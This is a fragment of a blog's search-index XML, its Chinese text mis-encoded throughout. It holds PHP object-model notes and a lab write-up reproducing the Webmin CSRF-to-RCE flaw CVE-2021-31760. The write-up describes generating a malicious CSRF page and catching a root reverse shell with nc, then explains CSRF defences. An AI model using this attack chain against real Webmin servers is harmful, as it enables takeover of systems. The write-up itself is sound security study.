<h3 id="æŠ½è±¡ç±»"><a href="#æŠ½è±¡ç±»" class="headerlink" title="æŠ½è±¡ç±»"></a>æŠ½è±¡ç±»</h3><p>å®šä¹‰ä¸ºæŠ½è±¡çš„ç±»ä¸èƒ½è¢«å®ä¾‹åŒ–ã€‚å¦‚æœå®ƒé‡Œé¢è‡³å°‘æœ‰ä¸€ä¸ªæ–¹æ³•æ˜¯è¢«å£°æ˜ä¸ºæŠ½è±¡çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å°±å¿…é¡»è¢«å£°æ˜ä¸ºæŠ½è±¡çš„ã€‚ç»§æ‰¿ä¸€ä¸ªæŠ½è±¡ç±»çš„æ—¶å€™ï¼Œå­ç±»å¿…é¡»å®šä¹‰çˆ¶ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼›å¦å¤–ï¼Œè¿™äº›æ–¹æ³•çš„<a href="https://www.php.net/manual/zh/language.oop5.visibility.php" target="_blank" rel="noopener">è®¿é—®æ§åˆ¶</a>å¿…é¡»å’Œçˆ¶ç±»ä¸­ä¸€æ ·ï¼ˆæˆ–è€…æ›´ä¸ºå®½æ¾ï¼‰ã€‚</p>
<h3 id="é‡è½½"><a href="#é‡è½½" class="headerlink" title="é‡è½½"></a>é‡è½½</h3><p>åŠ¨æ€åœ°åˆ›å»ºç±»å±æ€§å’Œæ–¹æ³•ã€‚é€šè¿‡é­”æœ¯æ–¹æ³•ï¼ˆmagic methodsï¼‰æ¥å®ç°ã€‚</p>
<p>å½“è°ƒç”¨å½“å‰ç¯å¢ƒä¸‹æœªå®šä¹‰æˆ–ä¸<a href="https://www.php.net/manual/zh/language.oop5.visibility.php" target="_blank" rel="noopener">å¯è§</a>çš„ç±»å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œé‡è½½æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</p>
<p>æ‰€æœ‰çš„é‡è½½æ–¹æ³•éƒ½å¿…é¡»è¢«å£°æ˜ä¸º <em>public</em>ã€‚</p>
<h4 id="å±æ€§é‡è½½"><a href="#å±æ€§é‡è½½" class="headerlink" title="å±æ€§é‡è½½"></a>å±æ€§é‡è½½</h4><p>åœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set" target="_blank" rel="noopener">__set()</a> ä¼šè¢«è°ƒç”¨ã€‚</p>
<p>è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get" target="_blank" rel="noopener">__get()</a> ä¼šè¢«è°ƒç”¨ã€‚</p>
<p>å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">isset()</a> æˆ– <a href="https://www.php.net/manual/zh/function.empty.php" target="_blank" rel="noopener">empty()</a> æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset" target="_blank" rel="noopener">__isset()</a> ä¼šè¢«è°ƒç”¨ã€‚</p>
<p>å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.unset.php" target="_blank" rel="noopener">unset()</a> æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset" target="_blank" rel="noopener">__unset()</a> ä¼šè¢«è°ƒç”¨ã€‚</p>
<h4 id="æ–¹æ³•é‡è½½"><a href="#æ–¹æ³•é‡è½½" class="headerlink" title="æ–¹æ³•é‡è½½"></a>æ–¹æ³•é‡è½½</h4><p>åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call" target="_blank" rel="noopener">__call()</a> ä¼šè¢«è°ƒç”¨ã€‚</p>
<p>åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic" target="_blank" rel="noopener">__callStatic()</a> ä¼šè¢«è°ƒç”¨ã€‚</p>
<h3 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h3><h4 id="sleep-å’Œ-wakeup"><a href="#sleep-å’Œ-wakeup" class="headerlink" title="__sleep()å’Œ__wakeup()"></a>__sleep()å’Œ__wakeup()</h4><p>åºåˆ—åŒ–æ—¶å…ˆè°ƒç”¨__sleep()æ–¹æ³•ã€‚ååºåˆ—è¯æ˜¯wakeupæ–¹æ³•ã€‚</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-31760æ¼æ´å¤ç°ä¸CSRFæ”»å‡»çš„åˆ†æ</title>
    <url>/2021/11/02/CVE-2021-31760%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8ECSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>é€šè¿‡ CVE-2021-31760 å¯¹ CSRF æ”»å‡»åšäº†ä¸€ç‚¹æ›´åŠ æ·±å…¥çš„äº†è§£ã€‚</p>
<a id="more"></a>

<h2 id="CSRF-æ”»å‡»çš„åŸºæœ¬åŸç†"><a href="#CSRF-æ”»å‡»çš„åŸºæœ¬åŸç†" class="headerlink" title="CSRF æ”»å‡»çš„åŸºæœ¬åŸç†"></a>CSRF æ”»å‡»çš„åŸºæœ¬åŸç†</h2><p><strong>CSRFï¼ˆCross-site request forgeryï¼‰</strong> çš„æ„æ€æ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ŒæŒ‡çš„æ˜¯ä¼ªé€ äº†å®¢æˆ·ç«¯çš„èº«ä»½ï¼Œä»¥å®¢æˆ·ç«¯çš„åä¹‰æ‰§è¡Œè¯·æ±‚ã€‚</p>
<p><img src="/2021/11/02/CVE-2021-31760%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8ECSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90/CSRF%E5%8E%9F%E7%90%86.jpg" alt="CSRFåŸç†"></p>
<p>å¦‚å›¾ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° CSRF çš„åŸºæœ¬è¦ç´ æœ‰ä¸¤ä¸ªï¼š</p>
<ol>
<li>ç”¨æˆ·ç™»å½•å—ä¿¡ä»»ç½‘ç«™ Aï¼Œå¹¶åœ¨æœ¬åœ°ç”Ÿæˆ Cookie</li>
<li>ç”¨æˆ·åœ¨ä¸ç™»å‡º A çš„æƒ…å†µä¸‹æ‰“å¼€æ”»å‡»ç«™ç‚¹ B</li>
</ol>
<p>å…¶æ”»å‡»æˆåŠŸçš„åŸç†æ˜¯ï¼Œ A ç½‘ç«™æ­£å¸¸ç™»é™†åï¼Œcookie æ­£å¸¸ä¿å­˜ï¼Œæ”»å‡»ç«™ç‚¹ B é€šè¿‡æŸç§æ–¹å¼è°ƒç”¨ A ç½‘ç«™æ¥å£è¿›è¡Œæ“ä½œï¼Œæ­¤æ—¶åœ¨è¯·æ±‚ A çš„æ¥å£æ—¶ä¼šè‡ªåŠ¨å¸¦ä¸Š cookieã€‚</p>
<p>è¿™ä¸ªæ”»å‡»çš„å®Œæˆéœ€è¦åŒæ—¶æ»¡è¶³ä»¥ä¸Šçš„ä¸¤ä¸ªè¦ç´ ï¼Œçœ‹èµ·æ¥ä¼¼ä¹æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œä½†æ˜¯å®ƒæ—¢ç„¶èƒ½ç™»ä¸Š OWASP çš„ top 10ï¼Œé‚£è¿™ä¸¤ä¸ªæ¡ä»¶æƒ³å¿…ä¹Ÿå¹¶ä¸æ˜¯é‚£ä¹ˆéš¾ä»¥æ»¡è¶³çš„ã€‚æ¯”å¦‚ï¼š</p>
<ul>
<li>ä½ ä¸èƒ½ä¿è¯ä½ ç™»å½•äº†ä¸€ä¸ªç½‘ç«™åï¼Œä¸å†æ‰“å¼€ä¸€ä¸ª tab é¡µé¢å¹¶è®¿é—®å¦å¤–çš„ç½‘ç«™ã€‚</li>
<li>ä½ ä¸èƒ½ä¿è¯ä½ å…³é—­æµè§ˆå™¨äº†åï¼Œä½ æœ¬åœ°çš„ Cookie ç«‹åˆ»è¿‡æœŸï¼Œä½ ä¸Šæ¬¡çš„ä¼šè¯å·²ç»ç»“æŸã€‚ï¼ˆç”±äºå…³é—­æµè§ˆå™¨å¹¶ä¸ä¸€å®šç»“æŸäº†ä¸€ä¸ªä¼šè¯ï¼‰</li>
<li>ä¸Šå›¾ä¸­æ‰€è°“çš„æ”»å‡»ç½‘ç«™ï¼Œå¯èƒ½æ˜¯ä¸€ä¸ªå­˜åœ¨å…¶ä»–æ¼æ´çš„å¯ä¿¡ä»»çš„ç»å¸¸è¢«äººè®¿é—®çš„ç½‘ç«™ã€‚</li>
</ul>
<p>è¿™æ ·çœ‹èµ·æ¥ï¼Œç»™æ”»å‡»ç«™ç‚¹å¥½å¥½åŒ…è£…ä¸€ä¸‹ï¼Œè®©å®ƒé•¿å¾—æ›´åŠ å¯ä¿¡ä¸€ç‚¹ï¼Œ CSRF å¥½åƒä¹Ÿæ²¡æœ‰é‚£ä¹ˆå›°éš¾ï¼ˆé€ƒ</p>
<h2 id="CVE-2021-31760-å¤ç°"><a href="#CVE-2021-31760-å¤ç°" class="headerlink" title="CVE-2021-31760 å¤ç°"></a>CVE-2021-31760 å¤ç°</h2><h3 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>åˆ©ç”¨ CSRF æ”»å‡»é€šè¿‡ Webmin çš„è¿è¡Œè¿›ç¨‹ç‰¹æ€§å®ç° RCEï¼ˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼‰ã€‚</p>
<p>Webmin æ˜¯ä¸€ä¸ªå¯¹ç³»ç»Ÿæƒ…å†µè¿›è¡Œå›¾å½¢åŒ–ç®¡ç†çš„ Web ç«¯å·¥å…·ã€‚è¯¥æ¼æ´åœ¨ Webmin 1.973 ä¹‹å‰çš„ç‰ˆæœ¬å‡æœ‰æ•ˆã€‚åˆ©ç”¨è¯¥æ¼æ´å¯ä»¥ä½¿æœåŠ¡å™¨åå¼¹ Shell å¹¶ä»¥æ­¤è·å¾—ç®¡ç†å‘˜æƒé™ï¼Œå®ç° RCEã€‚</p>
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ä½¿ç”¨è™šæ‹Ÿæœºåœ¨å†…ç½‘ç¯å¢ƒä½¿ç”¨ docker æ­å»ºæœåŠ¡ã€‚å½“ç„¶ç”¨å…¬ç½‘ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚é…ç½®å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host: VMWare Ubuntu 20.04.3 LTS (192.168.110.105)</span><br><span class="line">Docker: Docker CE 20.10.10 - CentOS 8</span><br><span class="line">Webmin: Version 1.973 (192.168.110.105:10000)</span><br><span class="line">Attacker: WSL2 Ubuntu 20.04 LTS (172.31.114.202)</span><br></pre></td></tr></table></figure>

<p>å°† docker å®¹å™¨çš„ 10000 ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœºçš„ 10000 ç«¯å£ï¼Œä½¿å¾—è®¿é—® 192.168.110.105 çš„ 10000 ç«¯å£å³å¯è®¿é—®åˆ°å®¹å™¨å†…çš„ Webmin æœåŠ¡ã€‚å®‰è£…è¿‡ç¨‹ä¹Ÿå¾ˆç®€å•ï¼Œåœ¨ sourceforge ä¸‹è½½ Webmin æºç åæ‰§è¡Œ <code>setup.sh</code> å³å¯ã€‚</p>
<h3 id="æ¶æ„è¯·æ±‚æ„é€ "><a href="#æ¶æ„è¯·æ±‚æ„é€ " class="headerlink" title="æ¶æ„è¯·æ±‚æ„é€ "></a>æ¶æ„è¯·æ±‚æ„é€ </h3><p>åœ¨ Attacker ä¸»æœºä¸Šèµ·å¥½ nginx æœåŠ¡ä½¿ä¹‹èƒ½å¤Ÿè¢«è®¿é—®åï¼Œè¿è¡Œ CVE ç»™åˆ°çš„ exp ,å¡«å†™éœ€è¦çš„ä¿¡æ¯ï¼Œç”Ÿæˆä¸€ä»½ç”¨äºæ”»å‡» Webmin çš„é¡µé¢ã€‚</p>
<p><img src="/2021/11/02/CVE-2021-31760%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8ECSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90/%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8F%E9%A1%B5%E9%9D%A2.jpg" alt="ç”Ÿæˆæ¶æ„é¡µé¢"></p>
<p>å…¶å®ä»è¿™ä¸ª exp çš„è¿è¡Œä¸Šæ¥çœ‹ï¼Œå®ƒçš„é€»è¾‘å·²ç»éå¸¸ç®€å•æ¸…æ™°äº†ï¼Œä¸è¿‡æˆ‘ä»¬ä¹Ÿå¯ä»¥å†æ‹¿å®ƒçš„æºç æ¥çœ‹ä¸€ä¸‹å®ƒçš„è¿ä½œè¿‡ç¨‹ã€‚</p>
<p><img src="/2021/11/02/CVE-2021-31760%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8ECSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90/%E4%B8%BB%E8%A6%81%E9%80%BB%E8%BE%91.jpg" alt="ä¸»è¦é€»è¾‘"></p>
<p>å¯ä»¥éå¸¸æ˜æ˜¾åœ°çœ‹åˆ°å…¶ä¸»è¦é€»è¾‘å°±åœ¨è¿™ä¸ª <code>CSRF_Generator()</code> å‡½æ•°ä¸­ï¼Œæ‹¿æˆ‘ä»¬åˆšæ‰å¡«å…¥çš„ target ä¿¡æ¯å’Œé€‰æ‹©çš„åå¼¹ shell ç±»å‹ï¼Œå»æ„å»ºäº†ä¸€ä¸ªå¯ä»¥æäº¤ POST è¡¨å•çš„ CSRF çš„é¡µé¢ï¼Œè¿™ä¸ª POST è¡¨å•ä¸­çš„ cmd å­—æ®µå°±æ˜¯æ„å»ºçš„åå¼¹ shell çš„å‘½ä»¤ã€‚ç”±äºæœ‰çš„æœåŠ¡å™¨å¯èƒ½æ²¡å®‰è£…æŸäº›è¯­è¨€ï¼Œæ‰€ä»¥åè¾¹çš„å‡ ä¸ªå¼¹ shell çš„å‘½ä»¤å¯èƒ½ä¼šå¤±è´¥â€¦ä½†æ˜¯ä¸€èˆ¬çš„æœåŠ¡å™¨åº”è¯¥éƒ½æœ‰ bash å§ï¼Œæ‰€ä»¥é€‰æ‹©ç¬¬ä¸€ä¸ªçš„ bash shell æ˜¯ä¸€èˆ¬éƒ½èƒ½æˆåŠŸçš„ã€‚</p>
<p>ä¹‹ååœ¨ Attacker çš„æœ¬åœ°å¼€å¯ <code>nc</code> ç›‘å¬ä¸€ä¸ªç‰¹å®šçš„ç«¯å£ï¼Œå½“ç½‘ç«™ç®¡ç†å‘˜ç‚¹è¿›äº†ç”Ÿæˆçš„æ¶æ„é¡µé¢ï¼Œå°±ä¼šå°† cmd æäº¤åˆ° Webmin ç«™ç‚¹çš„ <code>/proc/run.cgi</code> å»æ‰§è¡Œï¼Œå…¶ä¸­å°±åŒ…å«äº†ä½¿ç”¨ <code>nc</code> å‘ Attacker åå¼¹ shell çš„é€»è¾‘ã€‚è‡³æ­¤ Attacker å°±å°†ç›®æ ‡ getshell äº†ï¼Œä¹‹åä¹Ÿå¯ä»¥è¿›è¡Œä¸€äº›æ›´åŠ ä¾¿äºè®¿é—®çš„æ“ä½œï¼Œæ¯”å¦‚è¿ä¸ªèšå‰‘ä»€ä¹ˆçš„ï¼ˆ</p>
<h3 id="åå¼¹-shell"><a href="#åå¼¹-shell" class="headerlink" title="åå¼¹ shell"></a>åå¼¹ shell</h3><p>è¿™é‡Œæˆ‘ä½¿ç”¨äº† bash shell çš„é€‰é¡¹ï¼Œåœ¨ Attacker ä¸»æœºä¸Šç›‘å¬äº† 81 ç«¯å£ã€‚å½“ç®¡ç†å‘˜è®¿é—®äº†æˆ‘ä»¬çš„é¡µé¢æ—¶ï¼Œå¯ä»¥çœ‹åˆ° Attacker æœºä¸ŠæˆåŠŸæ‹¿åˆ°äº† Root æƒé™çš„ Shellã€‚</p>
<p><img src="/2021/11/02/CVE-2021-31760%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8ECSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90/GetShell.jpg" alt="æˆåŠŸæ‹¿åˆ°äº†åå¼¹ Shell"></p>
<h2 id="ä¸€äº›å…¶å®ƒé—®é¢˜"><a href="#ä¸€äº›å…¶å®ƒé—®é¢˜" class="headerlink" title="ä¸€äº›å…¶å®ƒé—®é¢˜"></a>ä¸€äº›å…¶å®ƒé—®é¢˜</h2><h3 id="åŒæºç­–ç•¥å’Œ-CSRF"><a href="#åŒæºç­–ç•¥å’Œ-CSRF" class="headerlink" title="åŒæºç­–ç•¥å’Œ CSRF"></a>åŒæºç­–ç•¥å’Œ CSRF</h3><p>åœ¨å¤ç°è¿™ä¸ª CVE çš„è¿‡ç¨‹ä¸­äº§ç”Ÿäº†è¿™æ ·ä¸€ä¸ªç–‘é—®ï¼šæ—¢ç„¶æ”»å‡»è€…ä¸ç›®æ ‡æœºçš„åŸŸåæ˜¯ä¸ä¸€æ ·çš„ï¼Œæµè§ˆå™¨ä¸ºä»€ä¹ˆè¿˜ä¼šå› ä¸ºæ”»å‡»è€…ç«™ç‚¹çš„è·¨åŸŸè¯·æ±‚ï¼Œå°†æºå¸¦äº† cookie çš„ POST è¯·æ±‚å‘é€åˆ°ç›®æ ‡æœºå‘¢ï¼ŸåŒæºç­–ç•¥ä¸ºä»€ä¹ˆæ²¡æœ‰å¯¹è¿™ä¸ª CSRF æ”»å‡»äº§ç”Ÿé™åˆ¶ï¼Ÿ</p>
<h4 id="åŒæºç­–ç•¥ï¼ˆSOPï¼‰"><a href="#åŒæºç­–ç•¥ï¼ˆSOPï¼‰" class="headerlink" title="åŒæºç­–ç•¥ï¼ˆSOPï¼‰"></a>åŒæºç­–ç•¥ï¼ˆSOPï¼‰</h4><p>åŒæºç­–ç•¥ä¸­çš„åŒæºæ˜¯æŒ‡åè®®ã€åŸŸåã€ç«¯å£éƒ½ä¸€æ ·ã€‚åŒæºç­–ç•¥å°†ä¸åŒæºçš„å„ä¸ªæœåŠ¡éš”ç¦»å¼€ï¼Œå¢åŠ äº†å®‰å…¨æ€§ã€‚ä¹‹æ‰€ä»¥ä¼šé‡åˆ°è·¨åŸŸé—®é¢˜ï¼Œæ­£æ˜¯å› ä¸ºåŒæºç­–ç•¥çš„å„ç§é™åˆ¶ã€‚åœ¨ä¸åŒçš„æƒ…å†µä¸‹ï¼ŒåŒæºç­–ç•¥å¯èƒ½æœ‰ä¸åŒçš„è§£é‡Šï¼š</p>
<ul>
<li>é™åˆ¶ cookiesã€DOM å’Œ JavaScript çš„å‘½ååŒºåŸŸ</li>
<li>é™åˆ¶ iframeã€å›¾ç‰‡ç­‰å„ç§èµ„æºçš„å†…å®¹æ“ä½œ</li>
<li>é™åˆ¶ ajax è¯·æ±‚çš„å“åº”ç»“æœ</li>
</ul>
<p>å¦‚æœæ²¡æœ‰äº† SOPï¼š</p>
<ul>
<li>ä¸€ä¸ªæµè§ˆå™¨æ‰“å¼€å‡ ä¸ª tabï¼Œæ•°æ®å°±æ³„éœ²äº†</li>
<li>ç”¨ iframe æ‰“å¼€ä¸€ä¸ªé“¶è¡Œç½‘ç«™ï¼Œå¯ä»¥è‚†æ„è¯»å–ç½‘ç«™çš„å†…å®¹ï¼Œè·å–ç”¨æˆ·è¾“å…¥çš„å†…å®¹</li>
<li>æ›´åŠ è‚†æ„åœ°è¿›è¡Œ CSRF</li>
</ul>
<h4 id="åŒæºç­–ç•¥ä¸ºä»€ä¹ˆä¸èƒ½é˜²æ­¢-CSRF"><a href="#åŒæºç­–ç•¥ä¸ºä»€ä¹ˆä¸èƒ½é˜²æ­¢-CSRF" class="headerlink" title="åŒæºç­–ç•¥ä¸ºä»€ä¹ˆä¸èƒ½é˜²æ­¢ CSRF"></a>åŒæºç­–ç•¥ä¸ºä»€ä¹ˆä¸èƒ½é˜²æ­¢ CSRF</h4><p>æ ¹æ®æˆ‘ä»¬å‰é¢å¯¹åŒæºç­–ç•¥çš„è§£é‡Šå‘ç°ï¼ŒåŒæºç­–ç•¥å¹¶æ²¡æœ‰é™åˆ¶ä½¿ç”¨ html tag åŠ è½½èµ„æºï¼Œè€Œä¸”å®ƒå¹¶ä¸æ˜¯é˜»æ­¢æ¥å£è¯·æ±‚è€Œæ˜¯æ‹¦æˆªè¯·æ±‚ç»“æœï¼ŒCSRF æ°æ°å äº†è¿™ä¸¤ä¸ªä¾¿å®œã€‚å®ƒå¯ä»¥ä½¿ç”¨ html tag è¿›è¡Œå®ç°ï¼Œå¹¶ä¸”åå¼¹ shell çš„æ“ä½œå¯¹äºæ˜¯å¦è¿”å›è¯·æ±‚ç»“æœå¹¶ä¸é‡è¦ï¼Œè¿™ä½¿å¾—åŒæºç­–ç•¥æ— æ³•æœ‰æ•ˆé˜²æ­¢ CSRFã€‚</p>
<p>å¯¹äº GET è¯·æ±‚ï¼Œç›´æ¥æ”¾åˆ° <code>&lt;img&gt;</code> å°±èƒ½ç¥ä¸çŸ¥é¬¼ä¸è§‰åœ°è¯·æ±‚è·¨åŸŸæ¥å£ã€‚å¯¹äº POST è¯·æ±‚ï¼Œå¾ˆå¤šä¾‹å­éƒ½ä½¿ç”¨ <code>&lt;form&gt;</code> æäº¤ã€‚å½’æ ¹åˆ°åº•ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•ä¸æŠ¥è·¨åŸŸæ˜¯å› ä¸ºè¯·æ±‚ç”± html æ§åˆ¶ï¼Œæˆ‘ä»¬æ— æ³•ç”¨ js ç›´æ¥æ“ä½œè·å¾—çš„ç»“æœã€‚</p>
<p>ä¸è¿‡åŒæºç­–ç•¥å¹¶éå®Œå…¨æ²¡æœ‰ä½œç”¨ã€‚SOP é™åˆ¶äº† cookie çš„å‘½ååŒºåŸŸï¼Œè™½ç„¶è¯·æ±‚ä¼šè‡ªåŠ¨å¸¦ä¸Š cookiesï¼Œä½†æ˜¯æ”»å‡»è€…æ— è®ºå¦‚ä½•è¿˜æ˜¯æ— æ³•è·å– cookie çš„å†…å®¹æœ¬èº«ã€‚</p>
<h3 id="é˜²èŒƒæ–¹å¼"><a href="#é˜²èŒƒæ–¹å¼" class="headerlink" title="é˜²èŒƒæ–¹å¼"></a>é˜²èŒƒæ–¹å¼</h3><p>æ—¢ç„¶åŒæºç­–ç•¥æ— æ³•å¯¹ CSRF è¿›è¡Œæœ‰æ•ˆçš„é˜²èŒƒï¼Œé‚£æˆ‘ä»¬è¦é˜²æ­¢ CSRF å°±éœ€è¦å¦è¾Ÿè¹Šå¾„ã€‚CSRF çš„é˜²å¾¡å¯ä»¥ä»æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¸¤æ–¹é¢ç€æ‰‹ï¼Œé˜²å¾¡æ•ˆæœæ˜¯ä»æœåŠ¡ç«¯ç€æ‰‹æ•ˆæœæ¯”è¾ƒå¥½ï¼Œç°åœ¨ä¸€èˆ¬çš„ CSRF é˜²å¾¡ä¹Ÿéƒ½åœ¨æœåŠ¡ç«¯è¿›è¡Œã€‚æœåŠ¡ç«¯é˜²å¾¡ CSRF çš„åŸºæœ¬æ€æƒ³æ˜¯åœ¨ cookie ä¸­å¢åŠ ä¼ªéšæœºæ•°ã€‚</p>
<ol>
<li><p>Cookie Hashing</p>
<p>è¿™ç§é˜²èŒƒæ–¹æ³•çš„æ€æƒ³éå¸¸ç®€å•ã€‚æ—¢ç„¶ CSRF åªæ˜¯ä¼ªé€ ç”¨æˆ·è¯·æ±‚è€Œä¸èƒ½æ‹¿åˆ°ç”¨æˆ·çš„ cookie<br>ï¼Œé‚£ä¹ˆåªè¦å¯¹ Cookie è¿›è¡Œä¸€æ¬¡ hash è®¡ç®—ï¼Œç„¶ååœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¿™ä¸ª hash å€¼å°±å¥½äº†ã€‚<br>ä½†æ˜¯è¿™ç§æ–¹å¼å¹¶éå®Œç¾ã€‚ç”±äºç”¨æˆ·çš„ Cookie ä¹Ÿå¯èƒ½ç”±äºç½‘ç«™çš„ XSS æ¼æ´è¢«ç›—å–ï¼Œæ­¤æ—¶æ”»å‡»è€…ä¹Ÿå¯ä»¥è½»æ˜“ç®—å‡º Hashï¼Œæ‰€ä»¥ç»¼åˆæ¥çœ‹è¿™ç§ç®€å•çš„æ–¹æ³•ä¹Ÿå­˜åœ¨ä¸€å®šçš„æ¼æ´ã€‚</p>
</li>
<li><p>Authentication Code</p>
<p>è¿™ç§æ–¹å¼çš„æ€æƒ³ä¹Ÿååˆ†ç®€å•ï¼Œç”¨æˆ·æ¯æ¬¡æäº¤è¡¨å•éƒ½éœ€è¦å¡«å†™ä¸€ä¸ªéªŒè¯ç ï¼Œä¸è¿‡è¿™ç§æ–¹å¼æ˜“ç”¨æ€§å¹¶ä¸å¤ªå¥½ï¼ŒåŠ é‡äº†ç”¨æˆ·çš„éº»çƒ¦ã€‚å¥½åœ¨å¯ä»¥å®Œå…¨è§£å†³ CSRF çš„é—®é¢˜ã€‚</p>
</li>
<li><p>One-Time Tokens(ä¸åŒçš„è¡¨å•åŒ…å«ä¸€ä¸ªä¸åŒçš„ä¼ªéšæœºå€¼)</p>
<p>ä¸€èˆ¬é€šè¿‡ session token æ¥å®ç°ä¿æŠ¤ã€‚å½“å®¢æˆ·ç«¯è¯·æ±‚é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨ä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•° Tokenï¼Œå¹¶ä¸”å°† Token æ”¾ç½®åˆ° session å½“ä¸­ï¼Œç„¶åå°† Token å‘ç»™å®¢æˆ·ç«¯(ä¸€èˆ¬é€šè¿‡æ„é€  hidden è¡¨å•)ã€‚ä¸‹æ¬¡å®¢æˆ·ç«¯æäº¤è¯·æ±‚æ—¶ï¼ŒToken ä¼šéšç€è¡¨å•ä¸€èµ·æäº¤åˆ°æœåŠ¡å™¨ç«¯ã€‚æ¥æ”¶åˆ°è¯·æ±‚åï¼ŒæœåŠ¡å™¨ç«¯ä¼šå¯¹ Token å€¼è¿›è¡ŒéªŒè¯ï¼Œåˆ¤æ–­æ˜¯å¦å’Œ session ä¸­çš„ Token å€¼ç›¸ç­‰ï¼Œè‹¥ç›¸ç­‰ï¼Œåˆ™å¯ä»¥è¯æ˜è¯·æ±‚æœ‰æ•ˆï¼Œä¸æ˜¯ä¼ªé€ çš„ã€‚ç”±äºæ”»å‡»è€…æœåŠ¡å™¨ä¸èƒ½äº§ç”Ÿæœ‰æ•ˆçš„ Tokenï¼Œç›´æ¥å¯¹ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œè¯·æ±‚åŠ¿å¿…ä¸èƒ½é€šè¿‡éªŒè¯ï¼Œäºæ˜¯è§£å†³äº† CSRF çš„é—®é¢˜ã€‚</p>
</li>
</ol>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CVE</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
</search>
